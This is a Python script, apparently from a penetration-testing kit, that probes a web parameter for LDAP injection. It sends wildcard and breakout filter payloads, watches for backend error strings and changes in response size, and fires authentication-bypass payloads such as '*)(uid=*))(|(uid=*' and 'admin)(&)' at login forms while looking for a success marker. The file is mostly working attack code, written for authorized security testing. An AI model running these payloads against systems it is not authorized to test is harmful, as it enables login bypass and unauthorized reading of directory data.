#!/usr/bin/env python3
"""
ldap_fuzz.py — authorized LDAP-injection prober. Tests a single injection point (mark it FUZZ, or it appends
to a param / replaces FUZZ in --data) for:
  - ERROR-BASED   (an LDAP error string appears -> input reached the raw filter)
  - RESULT-DELTA  (a wildcard * returns a noticeably larger/different response than a specific value -> widened filter)
  - AUTH-ORACLE   (with --true, an auth-bypass payload flips the response to the "success" marker)
and reports the likely AND/OR context.

A hit is a finding ONLY once you confirm altered LOGIC and prove impact safely
(LDAP_INJECTION_TESTING_GUIDE.md §16/§20). LDAP injection is parser-dependent — verify the breakout by hand.

Usage:
  python3 ldap_fuzz.py -u "https://target/search?q=FUZZ"
  python3 ldap_fuzz.py -u "https://target/login" --method POST --data "user=FUZZ&pass=x" --true "Welcome"
"""
import argparse, re, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"

# LDAP error signatures across common backends (error-based detection, §7)
ERR_SIGS = [
    r"javax\.naming", r"InvalidSearchFilterException", r"Bad search filter",
    r"ldap_search\(\)", r"LDAP: error code \d+", r"DSID-[0-9A-Fa-f]+",
    r"NameErr", r"DirectoryServicesCOMException", r"protocol error",
    r"invalid (?:DN|filter|attribute)", r"com\.sun\.jndi", r"OpenLDAP",
]
ERR_RE = re.compile("|".join(ERR_SIGS), re.I)

# special-char + breakout probes (benign — only ALTER matching, never destroy) §5/§6
SPECIAL = ["*", "(", ")", "&", "|", "!", "\\", "=", "*)(uid=*", "*)(objectClass=*",
           "*))(|(objectClass=*", "x)(uid=*)", "\x00"]
# auth-bypass payloads (try as the injected field) §9
# NOTE: NUL is a literal 0x00 byte (up.quote -> %00 on the wire). Writing "%00" here would be
# double-encoded to %2500 and never truncate anything — the byte must be real (§14).
AUTHBYP = ["*", "*)(uid=*))(|(uid=*", "*)(|(objectClass=*)", "admin)(&)",
           "admin)(|(uid=*", "*))\x00"]


def build_req(url, data, inject_field, payload):
    """Return (url, data) with `payload` placed at the FUZZ marker / chosen field."""
    enc = up.quote(payload, safe="")
    if data:
        if "FUZZ" in data:
            return url, data.replace("FUZZ", enc)
        # replace the chosen field's value
        pairs = []
        for kv in data.split("&"):
            k = kv.split("=", 1)[0]
            if inject_field and k == inject_field:
                pairs.append(f"{k}={enc}")
            else:
                pairs.append(kv)
        return url, "&".join(pairs)
    # GET
    if "FUZZ" in url:
        return url.replace("FUZZ", enc), None
    sep = "&" if "?" in url else "?"
    return url + sep + "q=" + enc, None


def send(sess, method, url, data, timeout):
    try:
        if method == "POST":
            r = sess.post(url, data=data, headers={"User-Agent": UA},
                          timeout=timeout, verify=False, allow_redirects=False)
        else:
            r = sess.get(url, headers={"User-Agent": UA},
                         timeout=timeout, verify=False, allow_redirects=False)
        return r
    except Exception as e:
        print(f"   [!] request error: {e}")
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="target URL; mark the injection point with FUZZ (GET)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body; mark injection with FUZZ or use --inject <field>")
    ap.add_argument("--inject", help="field name in --data to inject (if not using FUZZ)")
    ap.add_argument("--true", dest="truemark",
                    help="success/'logged-in' marker string -> enables AUTH-ORACLE auth-bypass test (§9)")
    ap.add_argument("--baseline", default="alice", help="a normal value to baseline against (default: alice)")
    ap.add_argument("--timeout", type=float, default=20)
    a = ap.parse_args()
    sess = requests.Session()

    # baseline with a normal value
    u, d = build_req(a.url, a.data, a.inject, a.baseline)
    rb = send(sess, a.method, u, d, a.timeout)
    if rb is None:
        sys.exit("baseline request failed")
    base_len = len(rb.text)
    print(f"[*] baseline value={a.baseline!r}  status={rb.status_code}  len={base_len}")

    # wildcard result-delta (§5/§10)
    u, d = build_req(a.url, a.data, a.inject, "*")
    rw = send(sess, a.method, u, d, a.timeout)
    if rw is not None:
        delta = len(rw.text) - base_len
        print(f"[*] wildcard '*'      status={rw.status_code}  len={len(rw.text)}  (delta {delta:+d})")
        if abs(delta) > max(80, base_len * 0.15) or rw.status_code != rb.status_code:
            print("   [RESULT-DELTA] '*' changed the response markedly -> filter may have WIDENED. "
                  "Confirm it returns MORE/OTHER entries (§10).")

    # special-char + breakout probes -> error-based + context (§5/§6/§7)
    print("\n[*] SPECIAL-CHAR / BREAKOUT probes (error-based + context):")
    and_or = None
    for p in SPECIAL:
        u, d = build_req(a.url, a.data, a.inject, p)
        r = send(sess, a.method, u, d, a.timeout)
        if r is None:
            continue
        tag = ""
        if ERR_RE.search(r.text):
            m = ERR_RE.search(r.text)
            tag = f"  [ERROR-BASED] LDAP error ~{m.group(0)!r} -> input reaches the raw filter (§7)"
        dl = len(r.text) - base_len
        if p == "*)(objectClass=*" and (abs(dl) > max(80, base_len * 0.15)):
            and_or = "AND (breakout *)(objectClass=*) widened results -> §6.1)"
        print(f"   payload={p!r:24} status={r.status_code} len={len(r.text)} (delta {dl:+d}){tag}")
    if and_or:
        print(f"   -> likely context: {and_or}")

    # auth-oracle (auth-bypass) — only with --true (§9)
    if a.truemark:
        print(f"\n[*] AUTH-BYPASS probes (looking for the success marker {a.truemark!r}):")
        for p in AUTHBYP:
            u, d = build_req(a.url, a.data, a.inject, p)
            r = send(sess, a.method, u, d, a.timeout)
            if r is None:
                continue
            hit = a.truemark in r.text or r.status_code in (301, 302, 303)
            flag = "  [AUTH BYPASS?] success marker / redirect -> CONFIRM login by hand (§9) <===" if hit else ""
            print(f"   payload={p!r:24} status={r.status_code} len={len(r.text)}{flag}")
        print("   -> a confirmed login WITHOUT valid creds = auth bypass. Note WHICH account you land on (admin->Critical).")

    print("\n[!] Reproduce any hit by hand: prove ALTERED LOGIC (more rows / flipped auth / a stable true-false oracle), "
          "not a reflected char. Use your own test account; bounded reads only; clean up (§20).")


if __name__ == "__main__":
    main()
